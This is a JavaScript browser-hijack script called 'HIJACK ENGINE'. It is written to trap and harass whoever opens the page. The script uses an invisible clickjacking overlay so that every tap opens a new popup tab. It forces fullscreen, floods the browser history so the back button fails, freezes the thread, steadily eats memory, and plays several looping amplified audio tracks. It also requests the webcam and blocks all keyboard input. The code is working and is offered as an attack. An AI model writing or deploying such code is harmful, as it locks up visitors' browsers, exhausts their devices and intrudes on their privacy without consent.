/** * HIJACK ENGINE v118us - RECURSIVE_POPUP_EDITION
 * Logic: Invisible Click-Jacking & Tab Duplication
 */

let leakStorage = [];

// 1. THE RECURSIVE TAB SPAWNER (The "You Are An Idiot" Loop)
function spawnDuplicate() {
    // Spawns a new tab of the same hijack file
    const target = "../System_Logs/v118us.91991829182882.html";
    const features = "width=100,height=100,menubar=no,status=no,location=no";
    
    // Attempt to bypass popup blockers by tying to a user click
    window.open(target, "_blank", features);
}

// 2. THE NAVIGATION & THREAD LOCK
function lockNavigation() {
    for(let i=0; i<200; i++) {
        history.pushState(null, null, location.href);
    }

    window.onpopstate = function() {
        // Freeze thread for 2 seconds
        const start = Date.now();
        while (Date.now() - start < 2000) { Math.random(); }
        
        // Spawn a duplicate tab when they try to go back
        spawnDuplicate();
        
        window.location.replace("../System_Logs/v118us.91991829182882.html");
    };
}

// 3. THE MEMORY DRAINER
function drainRAM() {
    setInterval(() => {
        const junk = new Array(1024 * 1024).join('FATAL_');
        leakStorage.push(junk);
        history.pushState({ p: junk }, "", location.href);
        if (leakStorage.length > 70) leakStorage.shift(); 
    }, 150);
}

const trigger = document.getElementById('overlay-trigger');

trigger.addEventListener('click', () => {
    trigger.style.display = 'none'; 
    
    // Create the "Invisible Click-Jacker" overlay
    const invisibleTrap = document.createElement('div');
    invisibleTrap.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:99999; opacity:0;";
    document.body.appendChild(invisibleTrap);

    // Every tap on the screen now spawns a new tab
    invisibleTrap.addEventListener('click', () => {
        spawnDuplicate();
    });

    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    lockNavigation();
    drainRAM();
    startChaos();
});

function startChaos() {
    // AUDIO DSP STRESS
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    for (let i = 0; i < 8; i++) {
        let audio = new Audio('../strings/other/audio/loudnoises.mp3'); 
        audio.loop = true;
        try {
            const source = audioCtx.createMediaElementSource(audio);
            const filter = audioCtx.createBiquadFilter();
            filter.type = "lowshelf";
            filter.frequency.setValueAtTime(1200, audioCtx.currentTime);
            filter.gain.setValueAtTime(35, audioCtx.currentTime);
            source.connect(filter);
            filter.connect(audioCtx.destination);
            audio.play().catch(() => {});
        } catch(e) { audio.play().catch(() => {}); }
    }

    // CAMERA FEED
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => { document.getElementById('camFeed').srcObject = stream; })
        .catch(() => {});

    // FLYING BOXES (Visual Chaos)
    setInterval(() => {
        const box = document.createElement('div');
        box.className = 'error-box';
        box.style.left = Math.random() * 90 + "vw";
        box.style.top = Math.random() * 90 + "vh";
        const speed = Math.random() * 1.5 + 0.5;
        box.style.animation = `flying ${speed}s infinite linear`;
        box.innerHTML = `[TAB_REPLICATION]<br>RAM: ${leakStorage.length}MB<br>OS_THREAD: LOCKED`;
        document.body.appendChild(box);
        if (document.querySelectorAll('.error-box').length > 150) {
            document.querySelectorAll('.error-box')[0].remove();
        }
    }, 50);

    // SYSTEM JITTER
    setInterval(() => {
        document.body.style.transform = `translate(${Math.random()*10-5}px, ${Math.random()*10-5}px)`;
    }, 30);
}

window.addEventListener('keydown', (e) => e.preventDefault());
